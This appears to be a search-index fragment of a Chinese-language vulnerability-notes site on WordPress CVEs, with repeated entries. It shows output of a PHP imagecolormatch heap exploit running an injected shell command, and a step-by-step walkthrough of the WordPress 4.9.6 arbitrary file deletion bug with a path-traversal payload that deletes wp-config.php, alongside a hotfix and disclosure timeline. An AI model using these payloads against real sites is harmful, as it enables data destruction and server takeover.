https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch","title":"imagecolormatch() OOB Heap Write exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/#imagecolormatch-oob-heap-write-exploit","text":"","title":"imagecolormatch() OOB Heap Write exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/#info","text":"My binary exploit for CVE-2019-6977 . Bug found by Simon Scannell from RIPS. PHP bug is here . Helps you bypass PHP's disable_functions INI directive. I commented a lot to help people that are new to binary PHP exploitation. Hope this helps.","title":"Info"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/#output","text":"GET http://target.com/exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi Nenuphar.ce: 0x7fe834a10018 Nenuphar2.ce: 0x7fe834a10d70 Nenuphar.properties: 0x7fe834a01230 z.val: 0x7fe834aaea18 Difference: 0xad7e8 Exploit SUCCESSFUL ! From: https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch","title":"Output"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"imagecolormatch() OOB Heap Write exploit \u00b6 Info \u00b6 My binary exploit for CVE-2019-6977 . Bug found by Simon Scannell from RIPS. PHP bug is here . Helps you bypass PHP's disable_functions INI directive. I commented a lot to help people that are new to binary PHP exploitation. Hope this helps. Output \u00b6 GET http://target.com/exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi Nenuphar.ce: 0x7fe834a10018 Nenuphar2.ce: 0x7fe834a10d70 Nenuphar.properties: 0x7fe834a01230 z.val: 0x7fe834aaea18 Difference: 0xad7e8 Exploit SUCCESSFUL ! From: https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch","title":"imagecolormatch() OOB Heap Write exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#imagecolormatch-oob-heap-write-exploit","text":"","title":"imagecolormatch() OOB Heap Write exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#info","text":"My binary exploit for CVE-2019-6977 . Bug found by Simon Scannell from RIPS. PHP bug is here . Helps you bypass PHP's disable_functions INI directive. I commented a lot to help people that are new to binary PHP exploitation. Hope this helps.","title":"Info"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-wordpress5.0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#output","text":"GET http://target.com/exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi Nenuphar.ce: 0x7fe834a10018 Nenuphar2.ce: 0x7fe834a10d70 Nenuphar.properties: 0x7fe834a01230 z.val: 0x7fe834aaea18 Difference: 0xad7e8 Exploit SUCCESSFUL ! From: https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch","title":"Output"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/","text":"WordPress_4.4_SSRF \u00b6 Official \u00b6 https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/ Affected Version \u00b6 WordPress <= 4.5 github\u83b7\u53d6 PoC \u00b6 \u6ce8\u610f\uff1a \u5916\u7f51 SSRF 4.4.1 4.4.2 \u5747\u6d4b\u8bd5\u901a\u8fc7\uff0c\u5185\u7f51\u6d4b\u8bd5\u5931\u8d25\u3002 DNGLog\u8bb0\u5f55\uff1a References \u00b6 http://xlab.baidu.com/wordpress/ http://blog.csdn.net/cd_xuyue/article/details/52276443","title":"WordPress_4.4_SSRF"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#wordpress_44_ssrf","text":"","title":"WordPress_4.4_SSRF"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#official","text":"https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/","title":"Official"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#affected-version","text":"WordPress <= 4.5 github\u83b7\u53d6","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#poc","text":"\u6ce8\u610f\uff1a \u5916\u7f51 SSRF 4.4.1 4.4.2 \u5747\u6d4b\u8bd5\u901a\u8fc7\uff0c\u5185\u7f51\u6d4b\u8bd5\u5931\u8d25\u3002 DNGLog\u8bb0\u5f55\uff1a","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/#references","text":"http://xlab.baidu.com/wordpress/ http://blog.csdn.net/cd_xuyue/article/details/52276443","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/","text":"WordPress_4.7.0-4.7.1_\u672a\u6388\u6743\u5185\u5bb9\u6ce8\u5165 \u00b6 Affected Version \u00b6 WordPress 4.7.0 WordPress 4.7.1 PoC \u00b6 \u6ce8\u610f\uff1a \u4ece\u5b98\u7f51\u4e0b\u8f7d\u76f8\u5e94\u6f0f\u6d1e\u7248\u672c\u540e\uff0c\u9700\u8981\u5728\u65ad\u7f51\u72b6\u6001\u4e0b\u8fdb\u884c\u5b89\u88c5\u6d4b\u8bd5\uff0c\u5426\u5219\u9ed8\u8ba4\u4f1a\u81ea\u52a8\u66f4\u65b0\u4fee\u590d\u8be5\u6f0f\u6d1e\u3002 github\u83b7\u53d6\u811a\u672c References \u00b6 https://www.exploit-db.com/exploits/41223/ http://paper.seebug.org/208/","title":"WordPress_4.7.0-4.7.1_\u672a\u6388\u6743\u5185\u5bb9\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#wordpress_470-471_","text":"","title":"WordPress_4.7.0-4.7.1_\u672a\u6388\u6743\u5185\u5bb9\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#affected-version","text":"WordPress 4.7.0 WordPress 4.7.1","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#poc","text":"\u6ce8\u610f\uff1a \u4ece\u5b98\u7f51\u4e0b\u8f7d\u76f8\u5e94\u6f0f\u6d1e\u7248\u672c\u540e\uff0c\u9700\u8981\u5728\u65ad\u7f51\u72b6\u6001\u4e0b\u8fdb\u884c\u5b89\u88c5\u6d4b\u8bd5\uff0c\u5426\u5219\u9ed8\u8ba4\u4f1a\u81ea\u52a8\u66f4\u65b0\u4fee\u590d\u8be5\u6f0f\u6d1e\u3002 github\u83b7\u53d6\u811a\u672c","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/#references","text":"https://www.exploit-db.com/exploits/41223/ http://paper.seebug.org/208/","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/","text":"WordPress_4.7_Info_Disclosure \u00b6 Official \u00b6 https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/ Affected Version \u00b6 WordPress 4.7 (4.7.1 fixed) PoC \u00b6 github\u83b7\u53d6\u811a\u672c References \u00b6 https://wpvulndb.com/vulnerabilities/8715","title":"WordPress_4.7_Info_Disclosure"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#wordpress_47_info_disclosure","text":"","title":"WordPress_4.7_Info_Disclosure"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#official","text":"https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/","title":"Official"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#affected-version","text":"WordPress 4.7 (4.7.1 fixed)","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#poc","text":"github\u83b7\u53d6\u811a\u672c","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/#references","text":"https://wpvulndb.com/vulnerabilities/8715","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/","text":"0x01 Wordpress\u7b80\u4ecb \u00b6 WordPress\u662f\u7f51\u7edc\u4e0a\u6700\u53d7\u6b22\u8fce\u7684CMS\u3002\u6839\u636e*w3tech*\uff0c\u5927\u7ea630\uff05\u7684\u7f51\u7ad9\u4f7f\u7528\u5b83 1 \u3002\u8fd9\u79cd\u5e7f\u6cdb\u7684\u91c7\u7528\u4f7f\u5176\u6210\u4e3a\u7f51\u7edc\u7f6a\u72af\u7684\u4e00\u4e2a\u6709\u8da3\u76ee\u6807\u3002\u5728\u8fd9\u7bc7\u535a\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecdWordPress\u6838\u5fc3\u4e2d\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u6267\u884c\u4efb\u610f\u4ee3\u7801\u30027\u4e2a\u6708\u524d\uff0c\u8be5\u6f0f\u6d1e\u5df2\u62a5\u544a\u7ed9WordPress\u5b89\u5168\u56e2\u961f\uff0c\u4f46\u4ecd\u672a\u4fee\u8865\u3002\u81ea\u9996\u6b21\u62a5\u544a\u4ee5\u6765\u5df2\u7ecf\u8fc7\u53bb\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u4efb\u4f55\u8865\u4e01\u6216\u5177\u4f53\u8ba1\u5212\uff0c\u8fd9\u4f7f\u6211\u4eec\u51b3\u5b9a\u5c06\u5176\u516c\u4e4b\u4e8e\u4f17\u3002 0x02 \u6f0f\u6d1e\u5206\u6790 \u8fd1\u65e5RIPS\u56e2\u961f ( \u4f5c\u8005\uff1aKarim El Ouerghemmi ) \u516c\u5f00\u4e86\u4e00\u4e2aWordpress\u7684 \u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e \uff08\u9700\u8981\u767b\u5f55\uff09\uff0c\u76ee\u524d\u8be5\u6f0f\u6d1e\u4ecd\u7136\u672a\u4fee\u590d\uff082018\u5e7406\u670827\u65e5\uff09\uff0c\u8be5\u6f0f\u6d1e\u5f71\u54cd Wordpress \u6700\u65b0\u7248 4.9.6. \u6587\u4ef6wp-includes/post.php\u4e2d\uff1a function wp_delete_attachment( $post_id, $force_delete = false ) { ... $meta = wp_get_attachment_metadata( $post_id ); ... if ( ! empty($meta['thumb']) ) { // Don't delete the thumb if another attachment uses it. if (! $wpdb->get_row( $wpdb->prepare( \"SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d\", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) { $thumbfile = str_replace(basename($file), $meta['thumb'], $file); /** This filter is documented in wp-includes/functions.php */ $thumbfile = apply_filters( 'wp_delete_file', $thumbfile ); @ unlink( path_join($uploadpath['basedir'], $thumbfile) ); } } ... } $meta['thumb'] \u6765\u81ea\u4e0e\u6570\u636e\u5e93\uff0c\u662f\u56fe\u7247\u7684\u5c5e\u6027\u4e4b\u4e00\u3002\u4ee3\u7801\u672a\u68c0\u67e5 $meta['thumb'] \u7684\u5185\u5bb9\uff0c\u76f4\u63a5\u5e26\u5165 unlink \u51fd\u6570\uff0c\u5982\u679c $meta['thumb'] \u53ef\u63a7\u5219\u53ef\u5bfc\u81f4\u6587\u4ef6\u5220\u9664\u3002 \u6587\u4ef6/wp-admin/post.php\u4e2d\uff1a ... switch($action) { ... case 'editattachment': check_admin_referer('update-post_' . $post_id); ... // Update the thumbnail filename $newmeta = wp_get_attachment_metadata( $post_id, true ); $newmeta['thumb'] = $_POST['thumb']; wp_update_attachment_metadata( $post_id, $newmeta ); ... $newmeta['thumb'] \u6765\u81ea\u4e8e$_POST['thumb']\uff0c\u672a\u7ecf\u8fc7\u6ee4\u76f4\u63a5\u5c06\u5176\u5b58\u5165\u6570\u636e\u5e93\uff0c\u5373\u4e0a\u4e00\u6b65\u7684 $meta['thumb'] \u53ef\u63a7\u3002 \u4e34\u65f6\u4fee\u8865\u7a0b\u5e8f \u00b6 \u901a\u8fc7\u5c06\u4fee\u590d\u7a0b\u5e8f\u6dfb\u52a0\u5230 functions.php \u5f53\u524d\u6d3b\u52a8\u7684\u4e3b\u9898/\u5b50\u4e3b\u9898\u7684\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u5c06\u4fee\u590d\u7a0b\u5e8f\u96c6\u6210\u5230\u73b0\u6709\u7684WordPress\u5b89\u88c5\u4e2d\u3002 add_filter( 'wp_update_attachment_metadata', 'rips_unlink_tempfix' ); function rips_unlink_tempfix( $data ) { if( isset($data['thumb']) ) { $data['thumb'] = basename($data['thumb']); } return $data; } \u6240\u63d0\u4f9b\u7684Hotfix\u6240\u505a\u7684\u5c31\u662f\u6302\u94a9 wp_update_attachement_metadata() \u8c03\u7528\u5e76\u786e\u4fdd\u4e3a\u5143\u503c\u63d0\u4f9b\u7684\u6570\u636e thumb \u4e0d\u5305\u542b\u4efb\u4f55\u53ef\u4ee5\u8fdb\u884c\u8def\u5f84\u904d\u5386\u7684\u90e8\u5206\u3002\u56e0\u6b64\uff0c\u4e0d\u80fd\u5220\u9664\u4efb\u4f55\u5b89\u5168\u76f8\u5173\u6587\u4ef6\u3002 \u63d0\u4f9b\u7684\u4fee\u590d\u7a0b\u5e8f\u6700\u7ec8\u5e94\u89c6\u4e3a\u4e34\u65f6\u4fee\u590d\uff0c\u4ee5\u9632\u6b62\u653b\u51fb\u3002\u6211\u4eec\u65e0\u6cd5\u76d1\u7763WordPress\u63d2\u4ef6\u7684\u6240\u6709\u53ef\u80fd\u7684\u5411\u540e\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u5e76\u5efa\u8bae\u60a8\u8c28\u614e\u5bf9WordPress\u6587\u4ef6\u8fdb\u884c\u4efb\u4f55\u4fee\u6539\u3002 \u62ab\u9732\u65f6\u95f4\uff1a \u65f6\u95f4\u7ebf \u00b6 \u65e5\u671f \u4ec0\u4e48 2017\u5e7411\u670820\u65e5 \u5728Hackerone\u4e0a\u5411WordPress\u5b89\u5168\u56e2\u961f\u62a5\u544a\u4e86\u6f0f\u6d1e\u3002 2017\u5e7411\u670822\u65e5 \u8be5\u6f0f\u6d1e\u7531\u5b89\u5168\u56e2\u961f\u8fdb\u884c\u5206\u7c7b\u548c\u9a8c\u8bc1\u3002 2017\u5e7412\u670812\u65e5 \u8981\u6c42\u8fdb\u6b65\u3002 2017\u5e7412\u670818\u65e5 Wordpress\u6b63\u5728\u5f00\u53d1\u4e00\u4e2a\u8865\u4e01\u3002\u8981\u6c42\u53d1\u5e03\u65e5\u671f\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e741\u67089\u65e5 \u8981\u6c42\u53d1\u5e03\u65e5\u671f\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e741\u670820\u65e5 \u7531\u4e8e\u95ee\u9898\u7684\u4e25\u91cd\u6027\u548c\u7f3a\u4e4f\u6c9f\u901a\u800c\u88ab\u8981\u6c42\u5bf9Hackerone\u8fdb\u884c\u8c03\u89e3\u3002 2018\u5e741\u670824\u65e5 WordPress\u5b89\u5168\u56e2\u961f\u4f30\u8ba1\u4fee\u590d\u65f6\u95f4\u4e3a6\u4e2a\u6708\u3002 2018\u5e745\u670824\u65e5 \u88ab\u95ee\u53ca\u6709\u5173\u8be5\u95ee\u9898\u7684\u8fdb\u5c55\u548c/\u6216\u8ba1\u5212\uff0c\u5e76\u63d0\u9192\u6211\u4eec\u5c06\u5c3d\u5feb\u53d1\u5e03\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e745\u670824\u65e5 \u5c06twitter DM\u53d1\u9001\u7ed9\u5b89\u5168\u56e2\u961f\u7684\u6210\u5458\uff0c\u4ee5\u786e\u4fdd\u4ed6\u4eec\u4e0d\u4f1a\u5ffd\u7565Hackerone\u4e0a\u7684\u6d88\u606f\u3002 2018\u5e746\u670826\u65e5 \u8be5\u95ee\u9898\u5728\u62a5\u544a\u540e\u8d85\u8fc77\u4e2a\u6708\u672a\u5f97\u5230\u4fee\u8865\u3002 \u8be6\u7ec6\u5206\u6790\u53ef\u89c1\uff1aWARNING: WordPress File Delete to Code Execution - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ 0x03 \u6f0f\u6d1e\u5229\u7528 \u00b6 \u6761\u4ef6\uff1a\u9700\u8981\u767b\u9646\u540e\u53f0\uff0c\u6709\u70b9\u9e21\u52a9 \u540e\u53f0\u5730\u5740\uff1a http://10.10.10.103/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.103%2Fwp-admin%2F&reauth=1 \u8fdb\u5165\u540e\u53f0\u540e\uff0c\u70b9\u51fbMedia\uff08\u5a92\u4f53\uff09\uff0c\u5728\u70b9\u51fbAdd New (\u6dfb\u52a0) \u8fdb\u5165\u5230\u4e0a\u4f20\u6587\u4ef6\u4f4d\u7f6e \u4e0a\u4f20\u597d\u56fe\u7247\u4ee5\u540e\uff0c\u70b9\u51fb\u53f3\u8fb9Edit\uff08\u7f16\u8f91\u6309\u94ae\uff09 \u8df3\u8f6c\u5230 http://10.10.10.103/wp-admin/post.php?post=21&action=edit \u6b64\u65f6\u6253\u5f00F12,\u641c\u7d22post.php,\u627e\u5230_wpnonce\u7684\u503c\u4e3ad8efee3064 \u7136\u540e\u53d1\u9001post\u6570\u636e\u5305 (\u9700\u8981\u5e26\u5165cookie\u503c) POST /wp-admin/post.php?post=21&action=edit HTTP/1.1 payload: action=editattachment&_wpnonce=d8efee3064&thumb=../../../../wp-config.php \u53d1\u9001\u6210\u529f\u4f1a\u8fd4\u56de302\u72b6\u6001 \u6b64\u65f6\u5728\u70b9\u51fb\u5220\u9664\u6309\u94ae Delete Permanently http://10.10.10.103/wp-admin/post.php?post=21&action=delete&_wpnonce=05621e9c6b \u6293\u5305\u67e5\u770b\uff0c\u4e5f\u662f\u8fd4\u56de302\u5305 \u518d\u53bb\u7f51\u7ad9\u6839\u76ee\u5f55\u67e5\u770bwp-config.php \u53d1\u73b0wp-config.php (\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u88ab\u6210\u529f\u5220\u9664\u4e86) \u518d\u6b21\u8bbf\u95ee\u9996\u9875\uff0c \u4f1a\u53d1\u73b0\u63d0\u793a\u4f60\u91cd\u65b0\u5b89\u88c5wordpress \u5f71\u54cd - \u653b\u51fb\u8005\u53ef\u4ee5\u505a\u4e9b\u4ec0\u4e48 \u00b6 \u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u5220\u9664WordPress\u5b89\u88c5\u7684\u4efb\u4f55\u6587\u4ef6\uff08+ PHP\u8fdb\u7a0b\u7528\u6237\u5177\u6709\u5220\u9664\u6743\u9650\u7684\u670d\u52a1\u5668\u4e0a\u7684\u4efb\u4f55\u5176\u4ed6\u6587\u4ef6\uff09\u3002\u9664\u4e86\u64e6\u9664\u6574\u4e2aWordPress\u5b89\u88c5\u7684\u53ef\u80fd\u6027\uff0c\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u5f53\u524d\u5907\u4efd\u53ef\u80fd\u4f1a\u4ea7\u751f\u707e\u96be\u6027\u540e\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u80fd\u529b\u6765\u89c4\u907f\u4e00\u4e9b\u5b89\u5168\u63aa\u65bd\u5e76\u5728Web\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u66f4\u786e\u5207\u5730\u8bf4\uff0c\u53ef\u4ee5\u5220\u9664\u4ee5\u4e0b\u6587\u4ef6\uff1a .htaccess\uff1a\u901a\u5e38\uff0c\u5220\u9664\u6b64\u6587\u4ef6\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u5b89\u5168\u540e\u679c\u3002\u4f46\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c*.htaccess*\u6587\u4ef6\u5305\u542b\u4e0e\u5b89\u5168\u6027\u76f8\u5173\u7684\u7ea6\u675f\uff08\u4f8b\u5982\uff0c\u5bf9\u67d0\u4e9b\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u7ea6\u675f\uff09\u3002\u5220\u9664\u6b64\u6587\u4ef6\u5c06\u505c\u7528\u8fd9\u4e9b\u5b89\u5168\u7ea6\u675f\u3002 index.php\u6587\u4ef6\uff1a\u901a\u5e38\u5c06\u7a7a\u7684*index.php*\u6587\u4ef6\u653e\u5165\u76ee\u5f55\u4e2d\uff0c\u4ee5\u9632\u6b62Web\u670d\u52a1\u5668\u65e0\u6cd5\u6267\u884c\u6b64\u64cd\u4f5c\u7684\u76ee\u5f55\u5217\u8868\u3002\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u4f1a\u5411\u653b\u51fb\u8005\u6388\u4e88\u53d7\u6b64\u5ea6\u91cf\u4fdd\u62a4\u7684\u76ee\u5f55\u4e2d\u6240\u6709\u6587\u4ef6\u7684\u5217\u8868\u3002 wp-config.php\uff1a\u5220\u9664WordPress\u5b89\u88c5\u7684\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5728\u4e0b\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\u89e6\u53d1WordPress\u5b89\u88c5\u8fc7\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a*wp-config.php*\u5305\u542b\u6570\u636e\u5e93\u51ed\u636e\uff0c\u5e76\u4e14\u6ca1\u6709\u5b83\u7684\u5b58\u5728\uff0cWordPress\u5c31\u50cf\u5c1a\u672a\u5b89\u88c5\u4e00\u6837\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u6b64\u6587\u4ef6\uff0c\u4f7f\u7528\u4ed6\u4e3a\u7ba1\u7406\u5458\u5e10\u6237\u9009\u62e9\u7684\u51ed\u636e\u8fdb\u884c\u5b89\u88c5\u8fc7\u7a0b\uff0c\u6700\u540e\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 0x04 \u53c2\u8003\u8d44\u6599 \u00b6 https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ https://xz.aliyun.com/t/2413","title":"0x01 Wordpress\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#0x01-wordpress","text":"WordPress\u662f\u7f51\u7edc\u4e0a\u6700\u53d7\u6b22\u8fce\u7684CMS\u3002\u6839\u636e*w3tech*\uff0c\u5927\u7ea630\uff05\u7684\u7f51\u7ad9\u4f7f\u7528\u5b83 1 \u3002\u8fd9\u79cd\u5e7f\u6cdb\u7684\u91c7\u7528\u4f7f\u5176\u6210\u4e3a\u7f51\u7edc\u7f6a\u72af\u7684\u4e00\u4e2a\u6709\u8da3\u76ee\u6807\u3002\u5728\u8fd9\u7bc7\u535a\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecdWordPress\u6838\u5fc3\u4e2d\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u6267\u884c\u4efb\u610f\u4ee3\u7801\u30027\u4e2a\u6708\u524d\uff0c\u8be5\u6f0f\u6d1e\u5df2\u62a5\u544a\u7ed9WordPress\u5b89\u5168\u56e2\u961f\uff0c\u4f46\u4ecd\u672a\u4fee\u8865\u3002\u81ea\u9996\u6b21\u62a5\u544a\u4ee5\u6765\u5df2\u7ecf\u8fc7\u53bb\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u4efb\u4f55\u8865\u4e01\u6216\u5177\u4f53\u8ba1\u5212\uff0c\u8fd9\u4f7f\u6211\u4eec\u51b3\u5b9a\u5c06\u5176\u516c\u4e4b\u4e8e\u4f17\u3002 0x02 \u6f0f\u6d1e\u5206\u6790 \u8fd1\u65e5RIPS\u56e2\u961f ( \u4f5c\u8005\uff1aKarim El Ouerghemmi ) \u516c\u5f00\u4e86\u4e00\u4e2aWordpress\u7684 \u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e \uff08\u9700\u8981\u767b\u5f55\uff09\uff0c\u76ee\u524d\u8be5\u6f0f\u6d1e\u4ecd\u7136\u672a\u4fee\u590d\uff082018\u5e7406\u670827\u65e5\uff09\uff0c\u8be5\u6f0f\u6d1e\u5f71\u54cd Wordpress \u6700\u65b0\u7248 4.9.6. \u6587\u4ef6wp-includes/post.php\u4e2d\uff1a function wp_delete_attachment( $post_id, $force_delete = false ) { ... $meta = wp_get_attachment_metadata( $post_id ); ... if ( ! empty($meta['thumb']) ) { // Don't delete the thumb if another attachment uses it. if (! $wpdb->get_row( $wpdb->prepare( \"SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d\", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) { $thumbfile = str_replace(basename($file), $meta['thumb'], $file); /** This filter is documented in wp-includes/functions.php */ $thumbfile = apply_filters( 'wp_delete_file', $thumbfile ); @ unlink( path_join($uploadpath['basedir'], $thumbfile) ); } } ... } $meta['thumb'] \u6765\u81ea\u4e0e\u6570\u636e\u5e93\uff0c\u662f\u56fe\u7247\u7684\u5c5e\u6027\u4e4b\u4e00\u3002\u4ee3\u7801\u672a\u68c0\u67e5 $meta['thumb'] \u7684\u5185\u5bb9\uff0c\u76f4\u63a5\u5e26\u5165 unlink \u51fd\u6570\uff0c\u5982\u679c $meta['thumb'] \u53ef\u63a7\u5219\u53ef\u5bfc\u81f4\u6587\u4ef6\u5220\u9664\u3002 \u6587\u4ef6/wp-admin/post.php\u4e2d\uff1a ... switch($action) { ... case 'editattachment': check_admin_referer('update-post_' . $post_id); ... // Update the thumbnail filename $newmeta = wp_get_attachment_metadata( $post_id, true ); $newmeta['thumb'] = $_POST['thumb']; wp_update_attachment_metadata( $post_id, $newmeta ); ... $newmeta['thumb'] \u6765\u81ea\u4e8e$_POST['thumb']\uff0c\u672a\u7ecf\u8fc7\u6ee4\u76f4\u63a5\u5c06\u5176\u5b58\u5165\u6570\u636e\u5e93\uff0c\u5373\u4e0a\u4e00\u6b65\u7684 $meta['thumb'] \u53ef\u63a7\u3002","title":"0x01 Wordpress\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_1","text":"\u901a\u8fc7\u5c06\u4fee\u590d\u7a0b\u5e8f\u6dfb\u52a0\u5230 functions.php \u5f53\u524d\u6d3b\u52a8\u7684\u4e3b\u9898/\u5b50\u4e3b\u9898\u7684\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u5c06\u4fee\u590d\u7a0b\u5e8f\u96c6\u6210\u5230\u73b0\u6709\u7684WordPress\u5b89\u88c5\u4e2d\u3002 add_filter( 'wp_update_attachment_metadata', 'rips_unlink_tempfix' ); function rips_unlink_tempfix( $data ) { if( isset($data['thumb']) ) { $data['thumb'] = basename($data['thumb']); } return $data; } \u6240\u63d0\u4f9b\u7684Hotfix\u6240\u505a\u7684\u5c31\u662f\u6302\u94a9 wp_update_attachement_metadata() \u8c03\u7528\u5e76\u786e\u4fdd\u4e3a\u5143\u503c\u63d0\u4f9b\u7684\u6570\u636e thumb 